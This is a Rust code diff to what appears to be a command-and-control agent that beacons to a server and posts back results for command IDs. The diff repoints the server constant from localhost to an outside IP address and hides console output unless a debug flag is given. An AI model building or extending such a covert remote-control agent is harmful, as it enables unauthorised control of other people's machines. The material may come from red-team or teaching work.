@@ -9,11 +9,11 @@ use std::path::Path;
 use wait_timeout::ChildExt;
 use std::io::Read;
 use dirs;
+use local_ip_address::local_ip;
 
-use pnet_datalink::interfaces;
 
 const sleep_time: Duration = time::Duration::from_millis(5000);
-const server_ip: &str = "https://127.0.0.1:443";
+const server_ip: &str = "https://129.21.49.57:443";
 
 fn initHost(host_ip:&str) -> Option<String>{
     let ip = host_ip;
@@ -43,22 +43,10 @@ fn initHost(host_ip:&str) -> Option<String>{
     return hostname;
 }
 
-//get IP address of interfaces
 fn get_local_ip() -> String {
-    let interfaces = interfaces();
-    let ip = "1.2.3.4"; //unknown address
-    for interface in interfaces {
-        if interface.is_loopback() {
-            continue;
-        }
-        for ip_addr in interface.ips {
-            let ip = format!("{}", ip_addr.ip());
-            if ip.contains(".") { //if it's an IPv4 address
-                return ip;
-            }
-        }
-    }
-    return ip.to_string();
+    let local_ip = local_ip().unwrap(); //get the local IP
+    let local_ip = format!("{}\n",local_ip); //format IP into string
+    return local_ip;
 }
 
 
@@ -188,7 +176,10 @@ fn post_response(cmd_id: &str, response: &str, identifier: &str){
 }
 
 fn print(txt:&str){
-    let print_bool: bool = true;
+    let mut print_bool: bool = false;
+    if(std::env::args().any(|x| x == "--debug")){
+        print_bool = true;
+    }
     if print_bool{
         println!("{}",txt);
     }
